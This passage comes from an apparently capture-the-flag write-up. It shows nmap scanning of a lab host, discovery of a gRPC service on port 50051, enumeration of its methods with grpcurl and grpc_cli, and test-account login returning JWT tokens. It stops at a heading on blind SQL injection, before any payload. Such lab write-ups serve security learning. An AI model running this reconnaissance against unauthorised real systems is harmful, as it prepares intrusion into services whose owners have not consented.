<span class="m">22</span>/tcp<span class="w">    </span>open<span class="w">  </span>ssh<span class="w">     </span>OpenSSH<span class="w"> </span><span class="m">8</span>.2p1<span class="w"> </span>Ubuntu<span class="w"> </span>4ubuntu0.7<span class="w"> </span><span class="o">(</span>Ubuntu<span class="w"> </span>Linux<span class="p">;</span><span class="w"> </span>protocol<span class="w"> </span><span class="m">2</span>.0<span class="o">)</span>
<span class="p">|</span><span class="w"> </span>ssh-hostkey:
<span class="p">|</span><span class="w">   </span><span class="m">3072</span><span class="w"> </span>91bf44edea1e3224301f532cea71e5ef<span class="w"> </span><span class="o">(</span>RSA<span class="o">)</span>
<span class="p">|</span><span class="w">   </span><span class="m">256</span><span class="w"> </span>8486a6e204abdff71d456ccf395809de<span class="w"> </span><span class="o">(</span>ECDSA<span class="o">)</span>
<span class="p">|</span>_<span class="w">  </span><span class="m">256</span><span class="w"> </span>1aa89572515e8e3cf180f542fd0a281c<span class="w"> </span><span class="o">(</span>ED25519<span class="o">)</span>
<span class="m">50051</span>/tcp<span class="w"> </span>open<span class="w">  </span>unknown
<span class="m">1</span><span class="w"> </span>service<span class="w"> </span>unrecognized<span class="w"> </span>despite<span class="w"> </span>returning<span class="w"> </span>data.<span class="w"> </span>If<span class="w"> </span>you<span class="w"> </span>know<span class="w"> </span>the<span class="w"> </span>service/version,<span class="w"> </span>please<span class="w"> </span>submit<span class="w"> </span>the<span class="w"> </span>following<span class="w"> </span>fingerprint<span class="w"> </span>at<span class="w"> </span>https://nmap.org/cgi-bin/submit.cgi?new-service<span class="w"> </span>:
SF-Port50051-TCP:V<span class="o">=</span><span class="m">7</span>.93%I<span class="o">=</span><span class="m">7</span>%D<span class="o">=</span><span class="m">5</span>/21%Time<span class="o">=</span>6469CE47%P<span class="o">=</span>aarch64-unknown-linux-g
SF:nu%r<span class="o">(</span>NULL,2E,<span class="s2">&quot;\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xf</span>
<span class="s2">SF:f\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0&quot;</span><span class="o">)</span>%r<span class="o">(</span>G
SF:enericLines,2E,<span class="s2">&quot;\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\</span>
<span class="s2">SF:xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0&quot;</span><span class="o">)</span>%r
SF:<span class="o">(</span>GetRequest,2E,<span class="s2">&quot;\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\</span>
<span class="s2">SF:xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0&quot;</span><span class="o">)</span>%r
SF:<span class="o">(</span>HTTPOptions,2E,<span class="s2">&quot;\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff</span>
<span class="s2">SF:\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0&quot;</span><span class="o">)</span>%
SF:r<span class="o">(</span>RTSPRequest,2E,<span class="s2">&quot;\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xf</span>
<span class="s2">SF:f\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0&quot;</span><span class="o">)</span>
SF:%r<span class="o">(</span>RPCCheck,2E,<span class="s2">&quot;\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\</span>
<span class="s2">SF:xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0&quot;</span><span class="o">)</span>%r
SF:<span class="o">(</span>DNSVersionBindReqTCP,2E,<span class="s2">&quot;\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x0</span>
<span class="s2">SF:5\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0</span>
<span class="s2">SF:\?\0\0&quot;</span><span class="o">)</span>%r<span class="o">(</span>DNSStatusRequestTCP,2E,<span class="s2">&quot;\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff</span>
<span class="s2">SF:\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\</span>
<span class="s2">SF:0\0\0\0\0\?\0\0&quot;</span><span class="o">)</span>%r<span class="o">(</span>Help,2E,<span class="s2">&quot;\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0</span>
<span class="s2">SF:\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\</span>
<span class="s2">SF:0\0\?\0\0&quot;</span><span class="o">)</span>%r<span class="o">(</span>SSLSessionReq,2E,<span class="s2">&quot;\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xf</span>
<span class="s2">SF:f\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0</span>
<span class="s2">SF:\0\0\0\?\0\0&quot;</span><span class="o">)</span>%r<span class="o">(</span>TerminalServerCookie,2E,<span class="s2">&quot;\0\0\x18\x04\0\0\0\0\0\0\x04\</span>
<span class="s2">SF:0\?\xff\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04</span>
<span class="s2">SF:\x08\0\0\0\0\0\0\?\0\0&quot;</span><span class="o">)</span>%r<span class="o">(</span>TLSSessionReq,2E,<span class="s2">&quot;\0\0\x18\x04\0\0\0\0\0\0\x</span>
<span class="s2">SF:04\0\?\xff\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\</span>
<span class="s2">SF:x04\x08\0\0\0\0\0\0\?\0\0&quot;</span><span class="o">)</span>%r<span class="o">(</span>Kerberos,2E,<span class="s2">&quot;\0\0\x18\x04\0\0\0\0\0\0\x04</span>
<span class="s2">SF:\0\?\xff\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x0</span>
<span class="s2">SF:4\x08\0\0\0\0\0\0\?\0\0&quot;</span><span class="o">)</span>%r<span class="o">(</span>SMBProgNeg,2E,<span class="s2">&quot;\0\0\x18\x04\0\0\0\0\0\0\x04</span>
<span class="s2">SF:\0\?\xff\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x0</span>
<span class="s2">SF:4\x08\0\0\0\0\0\0\?\0\0&quot;</span><span class="o">)</span><span class="p">;</span>
Service<span class="w"> </span>Info:<span class="w"> </span>OS:<span class="w"> </span>Linux<span class="p">;</span><span class="w"> </span>CPE:<span class="w"> </span>cpe:/o:linux:linux_kernel

Service<span class="w"> </span>detection<span class="w"> </span>performed.<span class="w"> </span>Please<span class="w"> </span>report<span class="w"> </span>any<span class="w"> </span>incorrect<span class="w"> </span>results<span class="w"> </span>at<span class="w"> </span>https://nmap.org/submit/<span class="w"> </span>.
Nmap<span class="w"> </span><span class="k">done</span>:<span class="w"> </span><span class="m">1</span><span class="w"> </span>IP<span class="w"> </span>address<span class="w"> </span><span class="o">(</span><span class="m">1</span><span class="w"> </span>host<span class="w"> </span>up<span class="o">)</span><span class="w"> </span>scanned<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">135</span>.25<span class="w"> </span>seconds
</pre></div>
</div>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>curl<span class="w"> </span>http://10.10.11.214:50051
curl:<span class="w"> </span><span class="o">(</span><span class="m">1</span><span class="o">)</span><span class="w"> </span>Received<span class="w"> </span>HTTP/0.9<span class="w"> </span>when<span class="w"> </span>not<span class="w"> </span>allowed

nc<span class="w"> </span><span class="m">10</span>.10.11.214<span class="w"> </span><span class="m">50051</span>
???
</pre></div>
</div>
<p>If waiting long enough while saying nothing on the socket we get this error:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>nc<span class="w"> </span><span class="m">10</span>.10.11.214<span class="w"> </span><span class="m">50051</span>
???@Did<span class="w"> </span>not<span class="w"> </span>receive<span class="w"> </span>HTTP/2<span class="w"> </span>settings<span class="w"> </span>before<span class="w"> </span>handshake<span class="w"> </span>timeout
</pre></div>
</div>
<p>A little bit of Google dorking brings us <a class="reference external" href="https://github.com/grpc/grpc/blob/f3574e3f642fdb74424ab97ed7c4d6c182f651f0/src/core/ext/transport/chttp2/server/chttp2_server.cc#L427">here</a></p>
<p><a class="reference external" href="https://zweilosec.github.io/posts/laser/">https://zweilosec.github.io/posts/laser/</a><br />
<a class="reference external" href="https://grpc.io/docs/what-is-grpc/introduction/">https://grpc.io/docs/what-is-grpc/introduction/</a><br />
<a class="reference external" href="https://grpc.io/docs/languages/python/basics/#client">https://grpc.io/docs/languages/python/basics/#client</a><br />
<a class="reference external" href="https://grpc.io/docs/languages/python/quickstart/">https://grpc.io/docs/languages/python/quickstart/</a></p>
<p>Following the quickstart guide for python</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>python3<span class="w"> </span>-m<span class="w"> </span>venv<span class="w"> </span>venv
<span class="nb">source</span><span class="w"> </span>venv/bin/activate
pip<span class="w"> </span>install<span class="w"> </span>--upgrade<span class="w"> </span>pip
python<span class="w"> </span>-m<span class="w"> </span>pip<span class="w"> </span>install<span class="w"> </span>grpcio
python<span class="w"> </span>-m<span class="w"> </span>pip<span class="w"> </span>install<span class="w"> </span>grpcio-tools
python3<span class="w"> </span>-m<span class="w"> </span>protoc<span class="w"> </span>--version
git<span class="w"> </span>clone<span class="w"> </span>-b<span class="w"> </span>v1.55.0<span class="w"> </span>--depth<span class="w"> </span><span class="m">1</span><span class="w"> </span>--shallow-submodules<span class="w"> </span>https://github.com/grpc/grpc<span class="w"> </span>~/grpc
<span class="nb">cd</span><span class="w"> </span>~/grpc/examples/python/helloworld
</pre></div>
</div>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>python<span class="w"> </span>greeter_server.py
Server<span class="w"> </span>started,<span class="w"> </span>listening<span class="w"> </span>on<span class="w"> </span><span class="m">50051</span>
</pre></div>
</div>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>python<span class="w"> </span>greeter_client.py
Will<span class="w"> </span>try<span class="w"> </span>to<span class="w"> </span>greet<span class="w"> </span>world<span class="w"> </span>...
Greeter<span class="w"> </span>client<span class="w"> </span>received:<span class="w"> </span>Hello,<span class="w"> </span>you!
</pre></div>
</div>
<p>Found grpcurl, looks like we can use this to enumerate the gRPC services present on this endpoint</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>docker<span class="w"> </span>pull<span class="w"> </span>fullstorydev/grpcurl:latest
docker<span class="w"> </span>run<span class="w"> </span>fullstorydev/grpcurl<span class="w"> </span>--plaintext<span class="w"> </span><span class="m">10</span>.10.11.214:50051<span class="w"> </span>list
SimpleApp
grpc.reflection.v1alpha.ServerReflection
</pre></div>
</div>
<p>List <code class="docutils literal notranslate"><span class="pre">methods</span></code> on the <code class="docutils literal notranslate"><span class="pre">SimpleApp</span></code> <code class="docutils literal notranslate"><span class="pre">service</span></code></p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>docker<span class="w"> </span>run<span class="w"> </span>fullstorydev/grpcurl<span class="w"> </span>--plaintext<span class="w"> </span><span class="m">10</span>.10.11.214:50051<span class="w"> </span>list<span class="w"> </span>SimpleApp
SimpleApp.LoginUser
SimpleApp.RegisterUser
SimpleApp.getInfo
</pre></div>
</div>
<p>Describe <code class="docutils literal notranslate"><span class="pre">services</span></code> on <code class="docutils literal notranslate"><span class="pre">SimpleApp</span></code></p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>docker<span class="w"> </span>run<span class="w"> </span>fullstorydev/grpcurl<span class="w"> </span>--plaintext<span class="w"> </span><span class="m">10</span>.10.11.214:50051<span class="w"> </span>describe<span class="w"> </span>SimpleApp
SimpleApp<span class="w"> </span>is<span class="w"> </span>a<span class="w"> </span>service:
service<span class="w"> </span>SimpleApp<span class="w"> </span><span class="o">{</span>
<span class="w">  </span>rpc<span class="w"> </span>LoginUser<span class="w"> </span><span class="o">(</span><span class="w"> </span>.LoginUserRequest<span class="w"> </span><span class="o">)</span><span class="w"> </span>returns<span class="w"> </span><span class="o">(</span><span class="w"> </span>.LoginUserResponse<span class="w"> </span><span class="o">)</span><span class="p">;</span>
<span class="w">  </span>rpc<span class="w"> </span>RegisterUser<span class="w"> </span><span class="o">(</span><span class="w"> </span>.RegisterUserRequest<span class="w"> </span><span class="o">)</span><span class="w"> </span>returns<span class="w"> </span><span class="o">(</span><span class="w"> </span>.RegisterUserResponse<span class="w"> </span><span class="o">)</span><span class="p">;</span>
<span class="w">  </span>rpc<span class="w"> </span>getInfo<span class="w"> </span><span class="o">(</span><span class="w"> </span>.getInfoRequest<span class="w"> </span><span class="o">)</span><span class="w"> </span>returns<span class="w"> </span><span class="o">(</span><span class="w"> </span>.getInfoResponse<span class="w"> </span><span class="o">)</span><span class="p">;</span>
<span class="o">}</span>
</pre></div>
</div>
<p>I should be able to describe the message types, but it’s not working for me, not sure what I’m doing wrong</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>docker<span class="w"> </span>run<span class="w"> </span>fullstorydev/grpcurl<span class="w"> </span>-format<span class="w"> </span>text<span class="w"> </span>-d<span class="w"> </span><span class="s1">&#39;name: &quot;gRPCurl&quot;&#39;</span><span class="w"> </span>--plaintext<span class="w"> </span><span class="m">10</span>.10.11.214:50051<span class="w"> </span>describe<span class="w"> </span>SimpleApp.RegisterUserRequest
Warning:<span class="w"> </span>The<span class="w"> </span>-d<span class="w"> </span>argument<span class="w"> </span>is<span class="w"> </span>not<span class="w"> </span>used<span class="w"> </span>with<span class="w"> </span><span class="s1">&#39;list&#39;</span><span class="w"> </span>or<span class="w"> </span><span class="s1">&#39;describe&#39;</span><span class="w"> </span>verb.
Failed<span class="w"> </span>to<span class="w"> </span>resolve<span class="w"> </span>symbol<span class="w"> </span><span class="s2">&quot;SimpleApp.RegisterUserRequest&quot;</span>:<span class="w"> </span>Symbol<span class="w"> </span>not<span class="w"> </span>found:<span class="w"> </span>SimpleApp.RegisterUserRequest
</pre></div>
</div>
<p>But it doesn’t matter, it’s easy to guess, the errors are pretty telling</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>docker<span class="w"> </span>run<span class="w"> </span>fullstorydev/grpcurl<span class="w"> </span>-format<span class="w"> </span>text<span class="w"> </span>-d<span class="w"> </span><span class="s1">&#39;username: &quot;blnkn&quot;, password: &quot;blnkn&quot;&#39;</span><span class="w"> </span>--plaintext<span class="w"> </span><span class="m">10</span>.10.11.214:50051<span class="w"> </span>SimpleApp.RegisterUser
message:<span class="w"> </span><span class="s2">&quot;Account created for user blnkn!&quot;</span>
</pre></div>
</div>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>docker<span class="w"> </span>run<span class="w"> </span>fullstorydev/grpcurl<span class="w"> </span>-format<span class="w"> </span>text<span class="w"> </span>-d<span class="w"> </span><span class="s1">&#39;username: &quot;blnkn&quot;, password: &quot;blnkn&quot;&#39;</span><span class="w"> </span>--plaintext<span class="w"> </span><span class="m">10</span>.10.11.214:50051<span class="w"> </span>SimpleApp.LoginUser
message:<span class="w"> </span><span class="s2">&quot;Your id is 848.&quot;</span>
</pre></div>
</div>
<p>Ah! I managed to make the message description work</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>docker<span class="w"> </span>run<span class="w"> </span>fullstorydev/grpcurl<span class="w"> </span>--plaintext<span class="w"> </span><span class="m">10</span>.10.11.214:50051<span class="w"> </span>describe<span class="w"> </span>.getInfoRequest
getInfoRequest<span class="w"> </span>is<span class="w"> </span>a<span class="w"> </span>message:
message<span class="w"> </span>getInfoRequest<span class="w"> </span><span class="o">{</span>
<span class="w">  </span>string<span class="w"> </span><span class="nv">id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">1</span><span class="p">;</span>
<span class="o">}</span>
</pre></div>
</div>
<p>But If I try to use the getInfo method with the id I got from the login I get that response</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>docker<span class="w"> </span>run<span class="w"> </span>fullstorydev/grpcurl<span class="w"> </span>-format<span class="w"> </span>text<span class="w"> </span>-d<span class="w"> </span><span class="s1">&#39;id: &quot;314&quot;&#39;</span><span class="w"> </span>--plaintext<span class="w"> </span><span class="m">10</span>.10.11.214:50051<span class="w"> </span>SimpleApp.getInfo
message:<span class="w"> </span><span class="s2">&quot;Authorization Error.Missing &#39;token&#39; header&quot;</span>
</pre></div>
</div>
<p>Using the verbose output on login, we get back a token</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>docker<span class="w"> </span>run<span class="w"> </span>fullstorydev/grpcurl<span class="w"> </span>-v<span class="w"> </span>-format<span class="w"> </span>text<span class="w"> </span>-d<span class="w"> </span><span class="s1">&#39;username: &quot;blnkn&quot;, password: &quot;blnkn&quot;&#39;</span><span class="w"> </span>--plaintext<span class="w"> </span><span class="m">10</span>.10.11.214:50051<span class="w"> </span>SimpleApp.LoginUser

Resolved<span class="w"> </span>method<span class="w"> </span>descriptor:
rpc<span class="w"> </span>LoginUser<span class="w"> </span><span class="o">(</span><span class="w"> </span>.LoginUserRequest<span class="w"> </span><span class="o">)</span><span class="w"> </span>returns<span class="w"> </span><span class="o">(</span><span class="w"> </span>.LoginUserResponse<span class="w"> </span><span class="o">)</span><span class="p">;</span>

Request<span class="w"> </span>metadata<span class="w"> </span>to<span class="w"> </span>send:
<span class="o">(</span>empty<span class="o">)</span>

Response<span class="w"> </span>headers<span class="w"> </span>received:
content-type:<span class="w"> </span>application/grpc
grpc-accept-encoding:<span class="w"> </span>identity,<span class="w"> </span>deflate,<span class="w"> </span>gzip

Response<span class="w"> </span>contents:
message:<span class="w"> </span><span class="s2">&quot;Your id is 588.&quot;</span>

Response<span class="w"> </span>trailers<span class="w"> </span>received:
token:<span class="w"> </span>b<span class="s1">&#39;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYmxua24iLCJleHAiOjE2ODQ2NzE3MTZ9.Dief11zbyraZtatsTOjZPY5gTGVLuHtWk9dMcrYU-BI&#39;</span>
Sent<span class="w"> </span><span class="m">1</span><span class="w"> </span>request<span class="w"> </span>and<span class="w"> </span>received<span class="w"> </span><span class="m">1</span><span class="w"> </span>response
</pre></div>
</div>
<p>Not sure how to pass the token properly</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>docker<span class="w"> </span>run<span class="w"> </span>fullstorydev/grpcurl<span class="w"> </span>-vv<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;token: &#39;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYmxua24iLCJleHAiOjE2ODQ2NzM0MzR9.xmXfeEpCdoXGOsRd5LgxadumMUkiTHIWBk8Iar_-miE&#39;&quot;</span><span class="w"> </span>--format<span class="w"> </span>text<span class="w"> </span>-d<span class="w"> </span><span class="s1">&#39;id: &quot;686&quot;&#39;</span><span class="w"> </span>--plaintext<span class="w"> </span><span class="m">10</span>.10.11.214:50051<span class="w"> </span>SimpleApp.getInfo

Resolved<span class="w"> </span>method<span class="w"> </span>descriptor:
rpc<span class="w"> </span>getInfo<span class="w"> </span><span class="o">(</span><span class="w"> </span>.getInfoRequest<span class="w"> </span><span class="o">)</span><span class="w"> </span>returns<span class="w"> </span><span class="o">(</span><span class="w"> </span>.getInfoResponse<span class="w"> </span><span class="o">)</span><span class="p">;</span>

Request<span class="w"> </span>metadata<span class="w"> </span>to<span class="w"> </span>send:
token:<span class="w"> </span><span class="s1">&#39;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYmxua24iLCJleHAiOjE2ODQ2NzM0MzR9.xmXfeEpCdoXGOsRd5LgxadumMUkiTHIWBk8Iar_-miE&#39;</span>

Response<span class="w"> </span>headers<span class="w"> </span>received:
content-type:<span class="w"> </span>application/grpc
grpc-accept-encoding:<span class="w"> </span>identity,<span class="w"> </span>deflate,<span class="w"> </span>gzip

Estimated<span class="w"> </span>response<span class="w"> </span>size:<span class="w"> </span><span class="m">44</span><span class="w"> </span>bytes

Response<span class="w"> </span>contents:
message:<span class="w"> </span><span class="s2">&quot;Authorization Error.Missing &#39;token&#39; header&quot;</span>

Response<span class="w"> </span>trailers<span class="w"> </span>received:
<span class="o">(</span>empty<span class="o">)</span>
Sent<span class="w"> </span><span class="m">1</span><span class="w"> </span>request<span class="w"> </span>and<span class="w"> </span>received<span class="w"> </span><span class="m">1</span><span class="w"> </span>response
</pre></div>
</div>
<p>Mmmmh also, maybe grpcurl is not the offical solution, there’s also grpc-cli.<br />
Let’s try to compile that</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>sudo<span class="w"> </span>apt-get<span class="w"> </span>update<span class="w"> </span>
sudo<span class="w"> </span>apt-get<span class="w"> </span>upgrade<span class="w"> </span>-y
sudo<span class="w"> </span>apt-get<span class="w"> </span>install<span class="w"> </span>build-essential<span class="w"> </span>autoconf<span class="w"> </span>libtool<span class="w"> </span>pkg-config<span class="w"> </span>cmake<span class="w"> </span>-y
git<span class="w"> </span>clone<span class="w"> </span>https://github.com/grpc/grpc.git
<span class="nb">cd</span><span class="w"> </span>grpc
git<span class="w"> </span>submodule<span class="w"> </span>update<span class="w"> </span>--init
sudo<span class="w"> </span>apt-get<span class="w"> </span>install<span class="w"> </span>-y<span class="w"> </span>libsystemd-dev
mkdir<span class="w"> </span>-p<span class="w"> </span>cmake/build
<span class="nb">cd</span><span class="w"> </span>cmake/build
cmake<span class="w"> </span>-DgRPC_BUILD_TESTS<span class="o">=</span>ON<span class="w"> </span>../..
make<span class="w"> </span>grpc_cli
cp<span class="w"> </span>grpc_cli<span class="w"> </span>~/.local/bin
which<span class="w"> </span>grpc_cli
/home/blnkn/.local/bin/grpc_cli
</pre></div>
</div>
<p>Getting familiar with <code class="docutils literal notranslate"><span class="pre">grpc_cli</span></code></p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>grpc_cli
No<span class="w"> </span><span class="nb">command</span><span class="w"> </span>specified
<span class="w">  </span>grpc_cli<span class="w"> </span>ls<span class="w"> </span>...<span class="w">         </span><span class="p">;</span><span class="w"> </span>List<span class="w"> </span>services
<span class="w">  </span>grpc_cli<span class="w"> </span>call<span class="w"> </span>...<span class="w">       </span><span class="p">;</span><span class="w"> </span>Call<span class="w"> </span>method
<span class="w">  </span>grpc_cli<span class="w"> </span><span class="nb">type</span><span class="w"> </span>...<span class="w">       </span><span class="p">;</span><span class="w"> </span>Print<span class="w"> </span><span class="nb">type</span>
<span class="w">  </span>grpc_cli<span class="w"> </span>parse<span class="w"> </span>...<span class="w">      </span><span class="p">;</span><span class="w"> </span>Parse<span class="w"> </span>message
<span class="w">  </span>grpc_cli<span class="w"> </span>totext<span class="w"> </span>...<span class="w">     </span><span class="p">;</span><span class="w"> </span>Convert<span class="w"> </span>binary<span class="w"> </span>message<span class="w"> </span>to<span class="w"> </span>text
<span class="w">  </span>grpc_cli<span class="w"> </span>tojson<span class="w"> </span>...<span class="w">     </span><span class="p">;</span><span class="w"> </span>Convert<span class="w"> </span>binary<span class="w"> </span>message<span class="w"> </span>to<span class="w"> </span>json
<span class="w">  </span>grpc_cli<span class="w"> </span>tobinary<span class="w"> </span>...<span class="w">   </span><span class="p">;</span><span class="w"> </span>Convert<span class="w"> </span>text<span class="w"> </span>message<span class="w"> </span>to<span class="w"> </span>binary
<span class="w">  </span>grpc_cli<span class="w"> </span><span class="nb">help</span><span class="w"> </span>...<span class="w">       </span><span class="p">;</span><span class="w"> </span>Print<span class="w"> </span>this<span class="w"> </span>message,<span class="w"> </span>or<span class="w"> </span>per-command<span class="w"> </span>usage
</pre></div>
</div>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>grpc_cli<span class="w"> </span>ls<span class="w"> </span><span class="m">10</span>.10.11.214:50051
SimpleApp
grpc.reflection.v1alpha.ServerReflection
</pre></div>
</div>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>grpc_cli<span class="w"> </span>ls<span class="w"> </span><span class="m">10</span>.10.11.214:50051<span class="w"> </span>SimpleApp
LoginUser
RegisterUser
getInfo
</pre></div>
</div>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>grpc_cli<span class="w"> </span>ls<span class="w"> </span>-l<span class="w"> </span><span class="m">10</span>.10.11.214:50051<span class="w"> </span>SimpleApp
filename:<span class="w"> </span>app.proto
service<span class="w"> </span>SimpleApp<span class="w"> </span><span class="o">{</span>
<span class="w">  </span>rpc<span class="w"> </span>LoginUser<span class="o">(</span>LoginUserRequest<span class="o">)</span><span class="w"> </span>returns<span class="w"> </span><span class="o">(</span>LoginUserResponse<span class="o">)</span><span class="w"> </span><span class="o">{}</span>
<span class="w">  </span>rpc<span class="w"> </span>RegisterUser<span class="o">(</span>RegisterUserRequest<span class="o">)</span><span class="w"> </span>returns<span class="w"> </span><span class="o">(</span>RegisterUserResponse<span class="o">)</span><span class="w"> </span><span class="o">{}</span>
<span class="w">  </span>rpc<span class="w"> </span>getInfo<span class="o">(</span>getInfoRequest<span class="o">)</span><span class="w"> </span>returns<span class="w"> </span><span class="o">(</span>getInfoResponse<span class="o">)</span><span class="w"> </span><span class="o">{}</span>
<span class="o">}</span>
</pre></div>
</div>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>grpc_cli<span class="w"> </span><span class="nb">type</span><span class="w"> </span><span class="m">10</span>.10.11.214:50051<span class="w"> </span>getInfoRequest
message<span class="w"> </span>getInfoRequest<span class="w"> </span><span class="o">{</span>
<span class="w">  </span>string<span class="w"> </span><span class="nv">id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">1</span><span class="p">;</span>
<span class="o">}</span>
</pre></div>
</div>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>grpc_cli<span class="w"> </span><span class="nb">type</span><span class="w"> </span><span class="m">10</span>.10.11.214:50051<span class="w"> </span>LoginUserRequest

message<span class="w"> </span>LoginUserRequest<span class="w"> </span><span class="o">{</span>
<span class="w">  </span>string<span class="w"> </span><span class="nv">username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">1</span><span class="p">;</span>
<span class="w">  </span>string<span class="w"> </span><span class="nv">password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">2</span><span class="p">;</span>
<span class="o">}</span>
</pre></div>
</div>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>grpc_cli<span class="w"> </span><span class="nb">type</span><span class="w"> </span><span class="m">10</span>.10.11.214:50051<span class="w"> </span>RegisterUserRequest
message<span class="w"> </span>RegisterUserRequest<span class="w"> </span><span class="o">{</span>
<span class="w">  </span>string<span class="w"> </span><span class="nv">username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">1</span><span class="p">;</span>
<span class="w">  </span>string<span class="w"> </span><span class="nv">password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">2</span><span class="p">;</span>
<span class="o">}</span>
</pre></div>
</div>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>grpc_cli<span class="w"> </span>call<span class="w"> </span><span class="m">10</span>.10.11.214:50051<span class="w"> </span>SimpleApp.RegisterUser<span class="w"> </span><span class="s1">&#39;username: &quot;blnkn&quot;, password: &quot;blnkn&quot;&#39;</span>
connecting<span class="w"> </span>to<span class="w"> </span><span class="m">10</span>.10.11.214:50051
message:<span class="w"> </span><span class="s2">&quot;User Already Exists!!&quot;</span>
Rpc<span class="w"> </span>succeeded<span class="w"> </span>with<span class="w"> </span>OK<span class="w"> </span>status
</pre></div>
</div>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>grpc_cli<span class="w"> </span>call<span class="w"> </span><span class="m">10</span>.10.11.214:50051<span class="w"> </span>SimpleApp.LoginUser<span class="w"> </span><span class="s1">&#39;username: &quot;blnkn&quot;, password: &quot;blnkn&quot;&#39;</span>
connecting<span class="w"> </span>to<span class="w"> </span><span class="m">10</span>.10.11.214:50051
message:<span class="w"> </span><span class="s2">&quot;Your id is 317.&quot;</span>
Received<span class="w"> </span>trailing<span class="w"> </span>metadata<span class="w"> </span>from<span class="w"> </span>server:
token<span class="w"> </span>:<span class="w"> </span>b<span class="s1">&#39;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYmxua24iLCJleHAiOjE2ODQ2NzQ5NTV9.FOxpXVX1IpCCFq55UN0wdJvBbzsmgxafhS69bTeixto&#39;</span>
Rpc<span class="w"> </span>succeeded<span class="w"> </span>with<span class="w"> </span>OK<span class="w"> </span>status
</pre></div>
</div>
</section>
<section id="manual-blind-boolean-based-injection">
<h2>Manual blind Boolean based injection<a class="headerlink" href="#manual-blind-boolean-based-injection" title="Permalink to this heading">#</a></h2>
<p>We have 2 tables</p>
